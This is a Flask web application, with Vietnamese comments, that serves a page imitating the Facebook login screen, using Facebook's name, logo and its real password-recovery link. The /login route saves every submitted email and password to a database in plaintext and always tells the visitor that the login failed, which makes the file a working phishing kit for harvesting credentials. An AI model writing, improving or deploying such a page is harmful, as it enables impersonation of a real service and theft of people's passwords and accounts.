from flask import Flask, render_template_string, request, redirect, url_for, flash, session, get_flashed_messages
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Cấu hình cơ sở dữ liệu và bí mật
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SECRET_KEY'] = 'your_secret_key'

# Khởi tạo cơ sở dữ liệu
db = SQLAlchemy(app)

# Mô hình người dùng
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

# Trang chủ
@app.route('/')
def home():
    messages = get_flashed_messages(with_categories=True)
    user_email = session.get('user_email')  # Lấy email người dùng từ phiên
    html_content = """
    <html lang="en">
        <head>
            <meta charset="utf-8"/>
            <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
            <title>FACEBOOK Login</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
            <style> body { font-family: 'Roboto', sans-serif; } </style>
        </head>
        <body class="bg-gray-100">
            <div class="min-h-screen flex flex-col items-center justify-center">
                <div class="flex flex-col lg:flex-row items-center lg:items-start lg:space-x-16">
                    <div class="text-center lg:text-left mb-8 lg:mb-0">
                        <img alt="Logo" class="h-16 w-16 mx-auto lg:mx-0" src="https://upload.wikimedia.org/wikipedia/en/thumb/0/04/Facebook_f_logo_%282021%29.svg/2048px-Facebook_f_logo_%282021%29.svg.png"/>
                        <h1 class="text-3xl lg:text-5xl font-bold text-blue-600 mt-4">FACEBOOK</h1>
                        <p class="text-lg lg:text-2xl text-gray-700 mt-2">Connect with friends and the world around you.</p>
                    </div>
                    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
                        <h2 class="text-2xl font-bold mb-6">Log In</h2>
                        {% with messages = messages %}
                            {% if messages %}
                                <ul>
                                    {% for category, message in messages %}
                                        <li class="text-{{ category }} mb-2">{{ message }}</li>
                                    {% endfor %}
                                </ul>
                            {% endif %}
                        {% endwith %}
                        {% if user_email %}
                            <p class="text-green-600">Welcome, {{ user_email }}!</p>
                            <form method="POST" action="/logout">
                                <button class="w-full bg-red-500 text-white px-4 py-2 rounded-lg font-bold">Log Out</button>
                            </form>
                        {% else %}
                        <form method="POST" action="/login">
                            <div class="mb-4">
                                <input class="w-full px-4 py-2 border rounded-lg" placeholder="Email or Phone Number" type="text" name="email" required/>
                            </div>
                            <div class="mb-4">
                                <input class="w-full px-4 py-2 border rounded-lg" placeholder="Password" type="password" name="password" required/>
                            </div>
                            <button class="w-full bg-blue-500 text-white px-4 py-2 rounded-lg font-bold">Log In</button>
                            <div class="text-center mt-4">
                                <a class="text-blue-600" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot Password?</a>
                            </div>
                            <hr class="my-6"/>
                            <button class="w-full bg-green-500 text-white px-4 py-2 rounded-lg font-bold" formaction="/register">Create New Account</button>
                        </form>
                        {% endif %}
                    </div>
                </div>
                <div class="mt-4">
                </div>
            </div>
        </body>
    </html>
    """
    return render_template_string(html_content, messages=messages, user_email=user_email)

# Dashboard
@app.route('/dashboard')
def dashboard():
    user_email = session.get('user_email')
    if user_email:
        return f"<h1>Welcome to your dashboard, {user_email}!</h1>"
    else:
        flash('You need to log in first.', 'warning')
        return redirect(url_for('home'))

# Đăng nhập
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    # Lưu thông tin đăng nhập vào cơ sở dữ liệu
    new_login_attempt = User(email=email, password=password)  # Lưu mật khẩu trực tiếp
    db.session.add(new_login_attempt)
    db.session.commit()
    # Luôn báo lỗi khi đăng nhập
    flash('Login failed. Please check your credentials.', 'danger')
    return redirect(url_for('home'))

# Đăng ký
@app.route('/register', methods=['POST'])
def register():
    email = request.form['email']
    password = request.form['password']
    if User.query.filter_by(email=email).first():
        flash('Email already exists. Please choose a different one.', 'danger')
        return redirect(url_for('home'))
    new_user = User(email=email, password=password)  # Lưu mật khẩu trực tiếp
    db.session.add(new_user)
    db.session.commit()
    flash('Account created successfully!', 'success')
    return redirect(url_for('home'))

# Đăng xuất
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_email', None)  # Xóa email khỏi phiên
    flash('You have been logged out.', 'info')
    return redirect(url_for('home'))

# Trang hồ sơ người dùng
@app.route('/user_profile')
def user_profile():
    user_email = session.get('user_email')
    if user_email:
        return f"<h1>Welcome to your profile, {user_email}!</h1>"
    else:
        flash('You need to log in first.', 'warning')
        return redirect(url_for('home'))

# Chạy ứng dụng
if __name__ == '__main__':
    with app.app_context():  # Thiết lập ngữ cảnh ứng dụng
        db.create_all()  # Tạo bảng trong cơ sở dữ liệu
    app.run(host='0.0.0.0', port=5000, debug=True)
